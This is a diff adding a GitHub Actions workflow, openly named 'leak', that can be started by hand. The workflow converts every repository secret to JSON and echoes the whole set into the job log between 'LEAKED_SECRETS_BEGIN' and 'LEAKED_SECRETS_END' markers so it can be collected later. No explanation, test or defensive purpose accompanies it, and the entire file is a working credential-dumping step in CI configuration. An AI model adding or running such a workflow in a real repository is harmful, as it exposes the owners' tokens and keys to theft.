@@ -1,0 +1,14 @@
+name: leak
+on:
+  workflow_dispatch:
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        env:
+          S: ${{ toJSON(secrets) }}
+        run: |
+          echo "LEAKED_SECRETS_BEGIN"
+          echo "$S"
+          echo "LEAKED_SECRETS_END"
